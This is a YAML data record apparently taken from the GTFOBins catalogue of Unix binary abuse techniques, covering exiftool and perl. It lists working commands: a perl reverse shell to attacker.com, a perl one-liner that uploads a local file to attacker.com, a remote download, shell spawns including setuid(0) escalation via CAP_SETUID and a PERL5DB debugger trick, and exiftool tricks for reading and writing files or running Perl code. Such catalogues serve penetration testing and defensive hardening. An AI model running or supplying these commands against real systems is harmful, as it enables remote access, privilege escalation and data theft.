source_data:
  GTFOBins:
    raw:
      documents:
        exiftool:
          functions:
            file-read:
            - code: 'exiftool -filename=/path/to/output-file /path/to/input-file

                cat /path/to/output-file'
              comment: If the permissions allow it, files are moved (instead of copied) to the destination.
              contexts:
                sudo: null
                unprivileged: null
            file-write:
            - code: exiftool -filename=/path/to/output-file /path/to/input-file
              comment: If the permissions allow it, files are moved (instead of copied) to the destination.
              contexts:
                sudo: null
                unprivileged: null
            - binary: false
              code: exiftool "-description<=/path/to/input-file --filename /path/to/output-file
              comment: The output file must exists, either empty or be a supported image file. The content
                is written amidst other content.
              contexts:
                sudo: null
                unprivileged: null
            - binary: false
              code: exiftool "-description=DATA --filename /path/to/output-file
              comment: The output file must exists, either empty or be a supported image file. The content
                is written amidst other content.
              contexts:
                sudo: null
                unprivileged: null
            - binary: false
              code: exiftool -description -W /path/to/output-file --filename /path/to/input-file
              comment: Writes the metadata tags of the input file in textual format to the output.
              contexts:
                sudo: null
                unprivileged: null
            inherit:
            - code: exiftool -if '...' /etc/passwd
              comment: This allows to run Perl code (`...`).
              contexts:
                sudo: null
                unprivileged: null
              from: perl
        perl:
          functions:
            download:
            - code: 'perl -MIO::Socket::INET -e ''$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp")
                or die; print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata:
                true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "/path/to/output-file") or die;
                $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n")
                { $in_content = 1; } } close($s); close($fh);'''
              contexts:
                sudo: null
                unprivileged: null
              sender: http-server
            file-read:
            - code: perl -ne print /path/to/input-file
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            reverse-shell:
            - code: perl -e 'use Socket;$i="attacker.com";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
                -i");};'
              contexts:
                sudo: null
                unprivileged: null
              listener: tcp-server
            shell:
            - code: perl -e 'exec "/bin/sh"'
              contexts:
                capabilities:
                  code: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
                  list:
                  - CAP_SETUID
                sudo: null
                unprivileged: null
            - code: PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
              comment: The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.
              contexts:
                sudo: null
                unprivileged: null
            upload:
            - code: 'perl -MIO::Socket::INET -e ''$s = new IO::Socket::INET(PeerAddr=>"attacker.com",
                PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content
                = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type:
                application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection:
                close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'''
              contexts:
                sudo: null
                unprivileged: null
              receiver: http-server
